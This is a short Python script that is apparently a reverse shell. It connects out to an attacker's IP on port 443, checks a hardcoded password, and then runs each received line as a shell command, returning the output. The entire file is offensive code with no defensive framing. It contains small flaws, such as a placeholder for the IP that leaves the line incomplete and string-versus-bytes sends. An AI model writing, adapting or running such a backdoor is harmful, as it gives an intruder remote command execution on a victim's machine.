import subprocess
import socket

attacker = #your IP
port = 443
passwrd = "ReallyReallyLongPasswordForProtection"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def login():
    global s
    s.send("Login: ")
    pwd = s.recv(1024)

    if pwd.strip() != passwrd:
        login()

    else:
        s.send("connected#> ")
        Shell()

def Shell():
    while True:
        data = s.recv(1024)

        if data.strip() == "kill":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#> ")
s.connect((attacker, port))
login()
